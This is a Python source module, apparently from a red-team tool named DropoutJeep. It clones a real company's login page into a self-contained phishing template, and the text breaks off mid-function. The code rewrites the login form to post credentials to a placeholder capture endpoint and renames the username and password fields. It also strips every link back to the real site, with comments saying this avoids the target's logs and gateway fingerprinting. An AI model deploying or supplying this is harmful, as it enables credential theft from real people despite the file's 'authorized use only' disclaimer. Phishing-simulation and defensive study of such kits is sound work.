"""Corporate branding clone — login-page visual cloning for phishing sims.

Given a target company's real login URL, this module fetches the page, extracts
its visual identity (CSS, logo, favicon, dominant color scheme), and produces a
*self-contained* HTML landing-page template that visually matches the target.

The template generator is **adaptive**: it detects dark vs light themes, SPA vs
server-rendered pages, and preserves as much of the original page structure as
possible.  The form ``action`` is replaced with a ``{{FORM_ACTION}}`` placeholder
and the credential inputs are named ``{{USERNAME_FIELD}}`` / ``{{PASSWORD_FIELD}}``
so that DropoutJeep can substitute the real capture endpoint and field names at
render time.

Only ``requests`` + BeautifulSoup (``bs4``) are required for fetching and
parsing.  The produced template is a single HTML document with all CSS inlined
in ``<style>`` blocks, so it can be served from any host without cross-origin
asset dependencies.

This module is intended for **authorized** red-team / phishing-simulation use
only, against targets the operator has written permission to test.
"""

from __future__ import annotations

import base64
import html as _html_mod
import logging
import mimetypes
import os
import re
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse

import requests
from bs4 import BeautifulSoup

logger = logging.getLogger("dropoutjeep")

# --- Configuration -----------------------------------------------------------

DEFAULT_TIMEOUT = 15
MAX_RETRIES = 2
BACKOFF_BASE = 1.5  # seconds, doubled per retry

# A realistic desktop UA so we fetch the same markup a real visitor sees.
_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
)

# Placeholders the downstream DropoutJeep templating layer substitutes.
FORM_ACTION_PLACEHOLDER = "{{FORM_ACTION}}"
USERNAME_FIELD_PLACEHOLDER = "{{USERNAME_FIELD}}"
PASSWORD_FIELD_PLACEHOLDER = "{{PASSWORD_FIELD}}"

# Maximum number of remote CSS files to fetch and inline. Caps latency and
# outbound requests when cloning a page that references dozens of stylesheets.
MAX_CSS_FETCH = 12
# Hard ceiling on the total inlined CSS size (bytes) to keep templates sane.
MAX_INLINED_CSS_BYTES = 768 * 1024
# Max size for a single inlined image (bytes). Prevents bloating templates with
# huge assets while still covering logos and favicons.
MAX_INLINED_IMAGE_BYTES = 256 * 1024
# Max total inlined image bytes per template.
MAX_INLINED_IMAGES_TOTAL = 1024 * 1024

# CSS color value regex — hex, rgb(), rgba(), hsl(), hsla().
_RE_COLOR_VALUE = re.compile(
    r"#(?:[0-9a-fA-F]{3}|[0-9a-fA-F]{4}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})\b|"
    r"rgba?\(\s*\d{1,3}\s*,\s*\d{1,3}\s*,\s*\d{1,3}\s*(?:,\s*[\d.]+%?\s*)?\)|"
    r"hsla?\(\s*\d{1,3}\s*,\s*\d{1,3}%\s*,\s*\d{1,3}%\s*(?:,\s*[\d.]+%?\s*)?\)",
    re.I,
)


# --- HTTP helper -------------------------------------------------------------

def _session() -> requests.Session:
    """Build a requests.Session with browser-like default headers."""
    s = requests.Session()
    s.headers.update({
        "User-Agent": _USER_AGENT,
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": (
            "text/html,application/xhtml+xml,application/xml;q=0.9,"
            "image/avif,image/webp,*/*;q=0.8"
        ),
    })
    return s


def _fetch(url: str, session: Optional[requests.Session] = None) -> Optional[str]:
    """GET a URL with retries/backoff. Returns response text or None on failure."""
    sess = session or _session()
    last_exc: Optional[Exception] = None
    for attempt in range(MAX_RETRIES + 1):
        try:
            resp = sess.get(url, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
            if resp.status_code == 200:
                return resp.text
            if resp.status_code in (429, 503):
                import time, random
                wait = BACKOFF_BASE * (2 ** attempt) + random.uniform(0, 1)
                logger.warning(
                    "Rate-limit %s for %s; backing off %.1fs",
                    resp.status_code, url, wait,
                )
                time.sleep(wait)
                continue
            logger.warning("Fetch %s returned HTTP %s", url, resp.status_code)
            return None
        except requests.RequestException as exc:
            last_exc = exc
            import time
            wait = BACKOFF_BASE * (2 ** attempt)
            logger.warning("Fetch error for %s: %s (retry in %.1fs)", url, exc, wait)
            time.sleep(wait)
    if last_exc:
        logger.error("Fetch ultimately failed for %s: %s", url, last_exc)
    return None


def _fetch_bytes(url: str, session: Optional[requests.Session] = None) -> Optional[bytes]:
    """GET a URL returning raw bytes (for images / favicon). None on failure."""
    sess = session or _session()
    try:
        resp = sess.get(url, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
        if resp.status_code == 200:
            return resp.content
        logger.debug("Byte fetch %s returned HTTP %s", url, resp.status_code)
        return None
    except requests.RequestException as exc:
        logger.debug("Byte fetch error for %s: %s", url, exc)
        return None


def _fetch_text(url: str, session: Optional[requests.Session] = None) -> Optional[str]:
    """Fetch text with a content-type aware encoding guess."""
    sess = session or _session()
    try:
        resp = sess.get(url, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
        if resp.status_code == 200:
            if resp.encoding is None:
                resp.encoding = "utf-8"
            return resp.text
        return None
    except requests.RequestException:
        return None


def _data_uri_for_bytes(data: bytes, url: str) -> Optional[str]:
    """Build a base64 data URI for raw bytes, guessing the MIME type."""
    if not data:
        return None
    mime, _ = mimetypes.guess_type(url)
    if not mime:
        # Sniff common image magic bytes.
        if data.startswith(b"\x89PNG"):
            mime = "image/png"
        elif data.startswith(b"\xff\xd8\xff"):
            mime = "image/jpeg"
        elif data.startswith(b"GIF8"):
            mime = "image/gif"
        elif b"<svg" in data[:512].lower():
            mime = "image/svg+xml"
        elif data.startswith(b"\x00\x00\x01\x00"):
            mime = "image/x-icon"
        elif data.startswith(b"RIFF") and data[8:12] == b"WEBP":
            mime = "image/webp"
        else:
            mime = "application/octet-stream"
    encoded = base64.b64encode(data).decode("ascii")
    return f"data:{mime};base64,{encoded}"


# --- Public API --------------------------------------------------------------

def clone_login_page(url: str, output_dir: Optional[str] = None) -> Dict:
    """Clone a target login page's visual identity into a reusable template.

    Fetches the page at ``url``, extracts its CSS, logo, favicon, and dominant
    color scheme, and returns a structured dict plus a self-contained HTML
    landing-page template with placeholder form wiring.

    The template generator auto-detects the target's visual language — dark vs
    light theme, SPA vs server-rendered, form layout — and adapts accordingly
    instead of always producing the same generic card.

    Args:
        url: The target company's real login page URL.
        output_dir: Optional directory path. If provided, the produced HTML
            template is written to ``branding_clone.html`` inside it and the
            downloaded logo/favicon are saved alongside.

    Returns:
        Dict with keys:
            * ``html`` (str) — original fetched HTML.
            * ``css`` (str) — concatenated, inlined CSS extracted from the page.
            * ``logo_url`` (str) — best-guess logo image URL (absolute).
            * ``favicon_url`` (str) — favicon URL (absolute).
            * ``colors`` (dict) — ``{primary, secondary, accent, background}``.
            * ``theme`` (str) — ``"dark"``, ``"light"``, or ``"unknown"``.
            * ``spa`` (bool) — whether the target is a JS-rendered SPA.
            * ``template`` (str) — the generated self-contained HTML template.
            * ``template_path`` (str|None) — on-disk path if ``output_dir`` given.
            * ``error`` (str|None) — error message if cloning failed.
    """
    result: Dict = {
        "html": "",
        "css": "",
        "logo_url": "",
        "favicon_url": "",
        "colors": {},
        "theme": "unknown",
        "spa": False,
        "preserved": False,
        "template": "",
        "template_path": None,
        "error": None,
    }
    if not url:
        result["error"] = "A target URL is required."
        return result

    session = _session()
    html = _fetch(url, session)
    if not html:
        result["error"] = f"Failed to fetch {url}"
        return result
    result["html"] = html

    base_url = _base_url(url)
    is_spa = _detect_spa(html)
    result["spa"] = is_spa
    logger.info(
        "Cloning login page: %s (base %s, %s)",
        url,
        base_url,
        "SPA" if is_spa else "server-rendered",
    )

    css = _extract_css(html, base_url)
    result["css"] = css

    logo_url = _extract_logo(html, base_url)
    result["logo_url"] = logo_url

    favicon_url = _extract_favicon(html, base_url)
    result["favicon_url"] = favicon_url

    fonts = _extract_google_fonts(html)

    colors = _extract_colors(css) if css else {}
    # Fall back to colors inferred from inline style attributes if no CSS hit.
    if not colors:
        colors = _extract_colors_from_html(html)
    result["colors"] = colors

    theme = _detect_theme(colors, css, html)
    result["theme"] = theme
    logger.info("Detected theme: %s | colors: %s", theme, colors)

    template, preserved = _build_login_template(
        html=html,
        css=css,
        logo_url=logo_url,
        favicon_url=favicon_url,
        colors=colors,
        theme=theme,
        fonts=fonts,
        base_url=base_url,
        session=session,
    )
    result["template"] = template
    result["preserved"] = preserved

    # Strip anything that would call back to the original site when the page is
    # served from our domain: external scripts, stylesheets, frames, hotlinked
    # images, absolute links and meta refresh. A clone that phones home leaks the
    # simulation to the target's own web logs, and an image or script served from
    # their CDN is a fingerprint a gateway can match.
    template, neutralised = _neutralise_remote_refs(template)
    result["template"] = template
    result["neutralised"] = neutralised
    if any(neutralised.values()):
        logger.info("Neutralised remote refs in clone: %s", neutralised)

    if output_dir:
        try:
            os.makedirs(output_dir, exist_ok=True)
            tpl_path = os.path.join(output_dir, "branding_clone.html")
            with open(tpl_path, "w", encoding="utf-8") as fh:
                fh.write(template)
            result["template_path"] = tpl_path
            # Persist logo/favicon blobs when available for the operator.
            if logo_url:
                _persist_asset(logo_url, output_dir, "logo", session)
            if favicon_url:
                _persist_asset(favicon_url, output_dir, "favicon", session)
            logger.info("Template written to %s", tpl_path)
        except OSError as exc:
            logger.warning("Could not write template to %s: %s", output_dir, exc)

    return result


# --- Asset extraction --------------------------------------------------------

_PIXEL = ("data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")


def _neutralise_remote_refs(html: str) -> "tuple[str, dict]":
    """Remove references that would load from, or link back to, the real site.

    Returns the cleaned HTML and a count per category so the operator can see
    exactly what was stripped. Absolute URLs only: relative ones cannot resolve
    once the page is served from a different host, and data URIs are left alone.
    """
    counts = {
        "external_scripts": 0,
        "external_stylesheets": 0,
        "iframes": 0,
        "hotlinked_images": 0,
        "outbound_links": 0,
        "meta_refresh": 0,
        "base_tags": 0,
        "css_urls": 0,
    }

    def _sub(pattern: str, repl: str, key: str, limit: int = 0) -> None:
        nonlocal html
        html, n = re.subn(pattern, repl, html, flags=re.IGNORECASE | re.DOTALL)
        counts[key] += n

    # Scripts loaded from anywhere remote. Inline scripts are kept, they carry no
    # network call and some clones depend on them for layout.
    _sub(r'<script\b[^>]*\bsrc\s*=\s*["\'](?:https?:)?//[^"\']+["\'][^>]*>\s*</script\s*>', '', 'external_scripts')
    _sub(r'<script\b[^>]*\bsrc\s*=\s*["\'](?:https?:)?//[^"\']+["\'][^>]*/?>', '', 'external_scripts')

    # Remote stylesheets, including the Google Fonts links the builder may re-add.
    _sub(r'<link\b(?=[^>]*\brel\s*=\s*["\']?stylesheet)(?=[^>]*\bhref\s*=\s*["\'](?:https?:)?//)[^>]*>',
         '', 'external_stylesheets')

    # <base> changes how every relative URL resolves.
    _sub(r'<base\b[^>]*>', '', 'base_tags')

    # Frames, paired and bare.
    _sub(r'<iframe\b[^>]*>.*?</iframe\s*>', '', 'iframes')
    _sub(r'<iframe\b[^>]*/?>', '', 'iframes')

    # Hotlinked images become a 1x1 transparent pixel. The look suffers slightly,
    # the leak disappears.
    _sub(r'(<img\b[^>]*\bsrc\s*=\s*["\'])(?:https?:)?//[^"\']+(["\'])', r'\1' + _PIXEL + r'\2',
         'hotlinked_images')
    # srcset entries would load the remote copies too.
    _sub(r'\s+srcset\s*=\s*["\'][^"\']*["\']', '', 'hotlinked_images')

    # Outbound links point at the real brand. Neutralise the target, keep the text.
    _sub(r'(<a\b[^>]*\bhref\s*=\s*["\'])(?:https?:)?//[^"\']+(["\'])', r'\1#\2', 'outbound_links')

    # Meta refresh can redirect the victim away mid-capture.
    _sub(r'<meta\b[^>]*http-equiv\s*=\s*["\']?refresh[^>]*>', '', 'meta_refresh')

    # CSS fetches: @import and url(...) inside style blocks or style attributes.
    # "none" keeps the declaration valid and stops the request.
    _sub(r'@import\s+(?:url\()?["\']?(?:https?:)?//[^;]+;', '', 'css_urls')
    _sub(r'url\(\s*["\']?(?:https?:)?//[^)]*\)', 'none', 'css_urls')

    return html, counts

def _base_url(url: str) -> str:
    """Return the scheme://host[:port] base for resolving relative URLs."""
    parsed = urlparse(url)
    return f"{parsed.scheme}://{parsed.netloc}"


def _extract_css(html: str, base_url: str) -> str:
    """Extract and inline all CSS referenced by the page.

    Collects ``<style>`` block contents and fetches external ``<link
    rel="stylesheet">`` stylesheets (capped at :data:`MAX_CSS_FETCH` files and
    :data:`MAX_INLINED_CSS_BYTES` total size) into a single CSS string.

    Args:
        html: Raw page HTML.
        base_url: Absolute base URL for resolving relative stylesheet hrefs.

    Returns:
        Concatenated CSS string (may be empty if nothing was found).
    """
    soup = BeautifulSoup(html or "", "html.parser")
    chunks: List[str] = []

    # 1. Inline <style> blocks.
    for style in soup.find_all("style"):
        text = style.get_text()
        if text and text.strip():
            chunks.append(text.strip())

    # 2. External stylesheets.
    fetched = 0
    total_bytes = 0
    for link in soup.find_all("link", rel="stylesheet"):
        if fetched >= MAX_CSS_FETCH:
            logger.debug("Reached MAX_CSS_FETCH (%d); skipping further sheets", MAX_CSS_FETCH)
            break
        href = link.get("href")
        if not href:
            continue
        abs_url = urljoin(base_url, href)
        css_text = _fetch(abs_url)
        if css_text:
            total_bytes += len(css_text)
            if total_bytes > MAX_INLINED_CSS_BYTES:
                logger.debug("Exceeded MAX_INLINED_CSS_BYTES; truncating CSS")
                break
            chunks.append(css_text)
            fetched += 1

    css = "\n\n".join(chunks)
    # Resolve relative URLs inside the CSS so inlined styles still point at the
    # correct absolute assets (images, fonts) on the target host.
    css = _resolve_css_urls(css, base_url)
    # Inline @import rules so the final template has no external stylesheet deps.
    css = _inline_css_imports(css, base_url)
    logger.info("Extracted %d chars of CSS (%d inline + %d external)",
                len(css), sum(len(c) for c in chunks[:1]), fetched)
    return css


def _extract_logo(html: str, base_url: str) -> str:
    """Extract the logo image URL from the page.

    Heuristic priority:
      1. ``<img>`` inside an element whose class/id contains ``logo``.
      2. ``<img>`` with a class/id/src containing ``logo``.
      3. ``<a>`` with class/id ``logo`` wrapping an ``<img>``.
      4. ``<link rel="icon"|"apple-touch-icon">`` favicon as a last resort.

    Returns an absolute URL, or an empty string if none found.
    """
    soup = BeautifulSoup(html or "", "html.parser")

    # 1. <img> inside a logo-ish container.
    candidates = soup.find_all(attrs={"class": re.compile(r"\blogo\b", re.I)})
    candidates += soup.find_all(attrs={"id": re.compile(r"\blogo\b", re.I)})
    for container in candidates:
        img = container.find("img") if container.name != "img" else container
        if img and img.get("src"):
            return urljoin(base_url, img["src"])

    # 2. <img> with logo in class/id/src/alt.
    for img in soup.find_all("img"):
        blob = " ".join([
            " ".join(img.get("class", []) or []),
            img.get("id", "") or "",
            img.get("src", "") or "",
            img.get("alt", "") or "",
        ]).lower()
        if "logo" in blob:
            src = img.get("src")
            if src:
                return urljoin(base_url, src)

    # 3. <a class/logo> wrapping <img>.
    for a in soup.find_all("a"):
        a_blob = (a.get("class") or []) + [a.get("id", "") or ""]
        if any("logo" in (s or "").lower() for s in a_blob):
            img = a.find("img")
            if img and img.get("src"):
                return urljoin(base_url, img["src"])

    logger.debug("No logo image detected; returning empty string")
    return ""


def _extract_favicon(html: str, base_url: str) -> str:
    """Extract the favicon URL (best-effort).

    Checks ``<link rel="icon"|"shortcut icon"|"apple-touch-icon">`` and falls
    back to the conventional ``/favicon.ico``.
    """
    soup = BeautifulSoup(html or "", "html.parser")
    rels = ("icon", "shortcut icon", "apple-touch-icon", "apple-touch-icon-precomposed")
    for link in soup.find_all("link"):
        rel = (link.get("rel") or [])
        if isinstance(rel, str):
            rel = [rel]
        if any(r.strip().lower() in rels for r in rel):
            href = link.get("href")
            if href:
                return urljoin(base_url, href)
    # Conventional fallback.
    return urljoin(base_url, "/favicon.ico")


def _resolve_css_urls(css: str, base_url: str) -> str:
    """Rewrite relative ``url(...)`` references inside CSS to absolute URLs.

    Handles quoted and unquoted URLs while avoiding data: and absolute http
    references.  This keeps background images / fonts working after the CSS is
    inlined into a template served from a different origin.
    """
    if not css:
        return css

    def _rewrite(match: re.Match) -> str:
        prefix = match.group(1)
        raw = match.group(2)
        value = raw.strip("\"'")
        if not value or value.startswith(("data:", "http://", "https://", "#")):
            return match.group(0)
        suffix = raw[-1] if raw[-1] in ("\"", "'") else ""
        return f"{prefix}{urljoin(base_url, value)}{suffix}"

    # Match url("..."), url('...'), url(...)
    return re.sub(
        r"(url\s*\(\s*[\"']?)([^)\"']+)([\"']?\s*\))",
        _rewrite,
        css,
        flags=re.I,
    )


def _inline_css_imports(css: str, base_url: str) -> str:
    """Recursively inline up to two levels of ``@import`` rules.

    Stops early if the total CSS size would grow too large.
    """
    if not css:
        return css
    max_total = MAX_INLINED_CSS_BYTES
    for _ in range(2):
        imports = list(re.finditer(r"@import\s+(?:url\s*\()?\s*[\"']?([^\"')]+)[\"']?\s*\)?\s*;", css, re.I))
        if not imports:
            break
        for m in reversed(imports):
            url = m.group(1).strip("\"'")
            abs_url = urljoin(base_url, url)
            fetched = _fetch_text(abs_url)
            if fetched and len(css) + len(fetched) < max_total:
                css = css[: m.start()] + fetched + css[m.end():]
            elif fetched:
                logger.debug("Skipping @import inline to keep CSS under limit")
                break
    return css


# --- Page analysis helpers ----------------------------------------------------


def _detect_spa(html: str) -> bool:
    """Return True when the page looks like a JS-rendered SPA rather than a
    traditional server-rendered page with a usable login form in the initial
    markup.

    Heuristics (any one of these is a strong SPA signal):
      * Body text is < 200 chars (ignoring whitespace).
      * A ``<div id="root">`` or ``<div id="app">`` with no child form elements.
      * Presence of a bundled JS entrypoint (``<script type="module"
        src="/assets/...">``) and no ``<form>`` in the body.
    """
    if not html:
        return False
    soup = BeautifulSoup(html, "html.parser")
    body = soup.body
    if not body:
        return False

    body_text = body.get_text(" ", strip=True)
    has_form = bool(body.find("form"))

    # 1. Near-empty body with scripts is classic SPA.
    if len(body_text) < 200 and not has_form:
        logger.debug("SPA detected: minimal body text (%d chars), no <form>", len(body_text))
        return True

    # 2. React / Vue / Angular mount points with no form inside.
    for root_id in ("root", "app", "__next", "app-root"):
        root_el = body.find(id=root_id) or body.find(attrs={"id": root_id})
        if root_el:
            if not root_el.find("form"):
                logger.debug("SPA detected: <%s id=%r> without child <form>", root_el.name, root_id)
                return True

    # 3. Module script plus no form is almost always a bundled SPA.
    if body.find("script", type="module") and not has_form:
        logger.debug("SPA detected: <script type=module> present, no <form>")
        return True

    return False


def _extract_google_fonts(html: str) -> List[str]:
    """Extract Google Fonts CSS URLs from ``<link>`` tags in ``<head>``.

    Only returns actual font-face CSS URLs (those containing ``css2?family=``
    or ``css?family=``), not preconnect / dns-prefetch hints.

    Returns a list of absolute ``https://fonts.googleapis.com/css?...`` URLs
    (may be empty).
    """
    soup = BeautifulSoup(html or "", "html.parser")
    fonts: List[str] = []
    for link in soup.find_all("link"):
        href = (link.get("href") or "").strip()
        if "fonts.googleapis.com" in href and ("css2?family=" in href or "css?family=" in href):
            if href.startswith("//"):
                href = "https:" + href
            if href not in fonts:
                fonts.append(href)
    logger.debug("Extracted %d Google Font link(s)", len(fonts))
    return fonts


def _detect_theme(colors: Dict[str, str], css: str, html: str) -> str:
    """Detect whether the target uses a dark or light visual theme.

    Strategy (first hit wins):
      1. Check for explicit ``.dark`` class on ``<html>`` in the markup.
      2. Scan CSS for ``color-scheme: dark`` or ``prefers-color-scheme: dark``.
      3. Look for ``background-color`` on ``html`` / ``body`` in the CSS and
         check its luminance.
      4. Compare the extracted background colour's luminance.
      5. Fall back to ``"unknown"``.

    Returns ``"dark"``, ``"light"``, or ``"unknown"``.
    """
    # 1. Explicit markers in HTML.
    soup = BeautifulSoup(html or "", "html.parser")
    html_el = soup.find("html")
    if html_el:
        classes = " ".join(html_el.get("class", []) or [])
        if "dark" in classes.lower():
            logger.debug("Theme detected from <html class=dark>")
            return "dark"

    # 2. CSS explicit dark-mode hints.
    if css:
        if re.search(r"color-scheme\s*:\s*dark", css, re.I):
            logger.debug("Theme=dark (color-scheme: dark in CSS)")
            return "dark"
        if "prefers-color-scheme: dark" in css.lower():
            logger.debug("Theme=dark (prefers-color-scheme hint in CSS)")
            return "dark"

    # 3. Scan CSS for html/body background-color.
    if css:
        m = re.search(
            r"(?:html|body)\s*\{[^}]*background(?:-color)?\s*:\s*([#\w][^;}]*)",
            css, re.I,
        )
        if m:
            bg_raw = m.group(1).strip().rstrip(";").strip()
            lum = _relative_luminance(bg_raw)
            if lum is not None:
                if lum < 0.2:
                    logger.debug("Theme=dark (html/body bg luminance %.3f)", lum)
                    return "dark"
                if lum > 0.7:
                    logger.debug("Theme=light (html/body bg luminance %.3f)", lum)
                    return "light"

    # 4. Luminance of the extracted background colour.
    bg = (colors.get("background") or "").strip()
    if bg:
        lum = _relative_luminance(bg)
        if lum is not None:
            if lum < 0.2:
                logger.debug("Theme=dark (bg luminance %.3f)", lum)
                return "dark"
            if lum > 0.7:
                logger.debug("Theme=light (bg luminance %.3f)", lum)
                return "light"

    # 5. Fallback heuristic: count dark vs light colour references in the CSS
    # to guess the predominant theme.
    if css:
        dark_matches = len(re.findall(
            r"#[0-9a-fA-F]{6}", css
        ))
        # Count low-luminance hex colors in CSS as dark-theme signal.
        dark_bg_count = 0
        light_bg_count = 0
        for m in re.finditer(r"background(?:-color)?\s*:\s*(#[0-9a-fA-F]{6})", css, re.I):
            lum = _relative_luminance(m.group(1))
            if lum is not None:
                if lum < 0.2:
                    dark_bg_count += 1
                elif lum > 0.7:
                    light_bg_count += 1
        if dark_bg_count > light_bg_count and dark_bg_count > 2:
            logger.debug("Theme=dark (%d dark bg vs %d light bg in CSS)", dark_bg_count, light_bg_count)
            return "dark"
        if light_bg_count > dark_bg_count and light_bg_count > 2:
            logger.debug("Theme=light (%d light bg vs %d dark bg in CSS)", light_bg_count, dark_bg_count)
            return "light"

    return "unknown"


def _relative_luminance(color_str: str) -> Optional[float]:
    """Compute WCAG relative luminance for a CSS colour string.

    Handles hex (#rgb / #rrggbb / #rrggbbaa), ``rgb(r,g,b)`` and
    ``rgba(r,g,b,a)``.  Returns a float in [0, 1] or *None* if unparseable.
    """
    color_str = color_str.strip().lower()

    # hex
    m = re.match(
        r"^#([0-9a-f]{2})([0-9a-f]{2})([0-9a-f]{2})(?:[0-9a-f]{2})?$", color_str
    )
    if not m:
        m = re.match(
            r"^#([0-9a-f])([0-9a-f])([0-9a-f])(?:[0-9a-f])?$", color_str
        )
    if m:
        r, g, b = (int(c, 16) / 255.0 for c in m.groups())
        return _wcag_lum(r, g, b)

    # rgb / rgba
    m = re.match(
        r"^rgba?\(\s*(\d{1,3})\s*,\s*(\d{1,3})\s*,\s*(\d{1,3})\s*(?:,\s*[\d.]+%?\s*)?\)$",
        color_str,
    )
    if m:
        r, g, b = (int(c) / 255.0 for c in m.groups())
        return _wcag_lum(r, g, b)

    return None


def _wcag_lum(r: float, g: float, b: float) -> float:
    """WCAG 2.x relative luminance from linear sRGB channels."""
    def _linear(c: float) -> float:
        if c <= 0.04045:
            return c / 12.92
        return ((c + 0.055) / 1.055) ** 2.4

    return 0.2126 * _linear(r) + 0.7152 * _linear(g) + 0.0722 * _linear(b)


def _extract_login_form(
    html: str, base_url: str
) -> Optional[Tuple[str, str]]:
    """Try to find a login-type form in the HTML and return a rewritten
    version along with any form-level CSS class.

    The form's ``action`` is replaced with ``{{FORM_ACTION}}`` and the two
    most-likely credential fields are remapped to ``{{USERNAME_FIELD}}`` and
    ``{{PASSWORD_FIELD}}``.  Buttons that look like submit are preserved.

    Returns ``(form_html, form_class)`` or *None* if no suitable form was
    found.  ``form_html`` is the inner HTML of the ``<form>`` element (the
    form tag itself is rebuilt by the template layer).
    """
    if not html:
        return None
    soup = BeautifulSoup(html, "html.parser")
    forms = soup.find_all("form")
    if not forms:
        logger.debug("No <form> elements found in HTML")
        return None

    # Score forms: prefer ones with password + email/text inputs.
    best_form = None
    best_score = -1
    for form in forms:
        inputs = form.find_all("input")
        types = {inp.get("type", "text").lower() for inp in inputs}
        score = 0
        if "password" in types:
            score += 3
        if "email" in types:
            score += 2
        elif "text" in types:
            score += 1
        # Prefer forms with a button.
        if form.find("button") or form.find("input", type="submit"):
            score += 1
        if score > best_score:
            best_score = score
            best_form = form

    if best_form is None or best_score < 2:
        logger.debug("No suitable login form found (best score=%d)", best_score)
        return None

    # Clone the form so we don't mutate the parse tree.
    form_clone = BeautifulSoup(str(best_form), "html.parser").find("form")
    if form_clone is None:
        return None

    # Gather input elements.
    all_inputs: list = (
        form_clone.find_all("input")
        + form_clone.find_all("select")
        + form_clone.find_all("textarea")
    )

    # Identify username + password fields by heuristics.
    username_field: Optional[str] = None
    password_field: Optional[str] = None

    for inp in all_inputs:
        t = (inp.get("type") or "text").lower()
        n = (inp.get("name") or "").lower()
        i = (inp.get("id") or "").lower()
        p = (inp.get("placeholder") or "").lower()
        blob = f"{n} {i} {p}"

        if t == "password" and password_field is None:
            password_field = n or i or "password"
            inp["name"] = PASSWORD_FIELD_PLACEHOLDER
            if inp.get("id"):
                inp["id"] = PASSWORD_FIELD_PLACEHOLDER
        elif t in ("email", "text") and username_field is None:
            # Heuristic: prefer fields that look like email/username.
            if any(kw in blob for kw in ("email", "user", "login", "account")):
                username_field = n or i or "email"
                inp["name"] = USERNAME_FIELD_PLACEHOLDER
                if inp.get("id"):
                    inp["id"] = USERNAME_FIELD_PLACEHOLDER

    # If no obvious username field found by keyword, pick the first non-password
    # text/email input.
    if username_field is None:
        for inp in all_inputs:
            t = (inp.get("type") or "text").lower()
            n = (inp.get("name") or "").lower()
            if t in ("email", "text") and n != PASSWORD_FIELD_PLACEHOLDER:
                inp["name"] = USERNAME_FIELD_PLACEHOLDER
                if inp.get("id"):
                    inp["id"] = USERNAME_FIELD_PLACEHOLDER
                username_field = n or "email"
                break

    # Remaining un-remapped text inputs get the username placeholder too
    # (in case there are multiple).
    for inp in all_inputs:
        t = (inp.get("type") or "text").lower()
        if t in ("email", "text") and inp.get("name") not in (
            USERNAME_FIELD_PLACEHOLDER,
            PASSWORD_FIELD_PLACEHOLDER,
        ):
            inp["name"] = USERNAME_FIELD_PLACEHOLDER
            if inp.get("id"):
                inp["id"] = USERNAME_FIELD_PLACEHOLDER

    # Strip action from form — we set it at template render time.
    form_clone["action"] = FORM_ACTION_PLACEHOLDER
    form_clone["method"] = form_clone.get("method", "POST")

    # Resolve relative URLs in src/href attributes.
    for tag in form_clone.find_all(attrs={"src": True}):
        tag["src"] = urljoin(base_url, tag["src"])
    for tag in form_clone.find_all(attrs={"href": True}):
        tag["href"] = urljoin(base_url, tag["href"])

    form_class = " ".join(form_clone.get("class", []) or [])
    form_inner = form_clone.decode_contents()

    logger.info(
        "Extracted login form (username=%s, password=%s)",
        username_field or "?",
        password_field or "?",
    )
    return (form_inner, form_class)


def _is_junk_color(value: str) -> bool:
    """Return True if *value* is almost certainly not a meaningful brand colour.

    Filters out very short hex codes (partial matches from opacity tokens
    like ``#0000001f`` getting split) and rgba with near-zero alpha.
    """
    v = value.strip().lower()
    # 3-digit hex like #000, #fff — too generic.
    if re.match(r"^#[0-9a-f]{3}$", v):
        return True
    # 4-digit hex with alpha — nearly always an opacity partial match.
    if re.match(r"^#[0-9a-f]{4}$", v):
        return True
    # 8-digit hex with very low opacity (alpha <= 0x33 / 20%).
    m8 = re.match(r"^#([0-9a-f]{6})([0-9a-f]{2})$", v)
    if m8:
        alpha = int(m8.group(2), 16)
        if alpha <= 0x33:
            return True
    # rgba with alpha <= 0.2.
    m = re.match(r"^rgba?\(\s*[\d.]+\s*,\s*[\d.]+\s*,\s*[\d.]+.*?,\s*([\d.]+%?)\s*\)$", v)
    if m:
        alpha_str = m.group(1)
        if alpha_str.endswith("%"):
            pct = float(alpha_str[:-1])
            if pct <= 20:
                return True
        else:
            a = float(alpha_str)
            if a <= 0.2:
                return True
    return False


def _extract_colors(css: str) -> Dict[str, str]:
    """Extract a dominant color scheme from CSS.

    Scans the CSS for ``color:``, ``background(-color):``, ``border-color:``
    and gradient declarations, counts hex/rgb/rgba occurrences, and picks the
    most frequent as each role:

      * ``background`` — most common ``background(-color)`` value.
      * ``primary`` — most common foreground ``color`` (typically brand color).
      * ``secondary`` — second most common foreground color.
      * ``accent`` — most common ``border-color`` (or gradient hint).

    Args:
        css: CSS text to analyze.

    Returns:
        Dict with keys ``primary``, ``secondary``, ``accent``, ``background``
        (any may be an empty string if undeterminable).
    """
    if not css:
        return {"primary": "", "secondary": "", "accent": "", "background": ""}

    def _top_value(counter: Dict[str, int]) -> str:
        if not counter:
            return ""
        # Prefer longer hex codes (6-8 chars) over short ones (3-4 chars) which
        # are often garbage partial matches from Tailwind opacity tokens.
        ranked = sorted(counter.items(), key=lambda kv: (len(kv[0]), kv[1]), reverse=True)
        return ranked[0][0] if ranked else ""

    bg = _count_color_values(
        css, r"background(?:-color)?\s*:\s*([^;}]+?)(?:\s*!important)?\s*[;}]"
    )
    # Drop transparent/none/inherit/initial + very short hex codes that are
    # almost certainly not meaningful brand colours.
    _bg_filter = {"transparent", "none", "inherit", "initial", "currentcolor", "unset"}
    bg = {k: v for k, v in bg.items()
          if k.lower() not in _bg_filter and not _is_junk_color(k)}
    fg = _count_color_values(css, r"(?<![a-z-])color\s*:\s*([^;}]+?)(?:\s*!important)?\s*[;}]")
    fg = {k: v for k, v in fg.items()
          if k.lower() not in _bg_filter and not _is_junk_color(k)}
    border = _count_color_values(css, r"border(?:-color)?\s*:\s*([^;}]+?)(?:\s*!important)?\s*[;}]")
    border = {k: v for k, v in border.items()
              if k.lower() not in _bg_filter and not _is_junk_color(k)}
    gradient = _count_color_values(css, r"(gradient\([^)]*\))")

    primary = _top_value(fg)
    # Remove primary from fg to pick a distinct secondary.
    fg_secondary = {k: v for k, v in fg.items() if k != primary}
    secondary = _top_value(fg_secondary)
    accent = _top_value(border) or _top_value(gradient)
    background = _top_value(bg)

    colors = {
        "primary": primary,
        "secondary": secondary,
        "accent": accent,
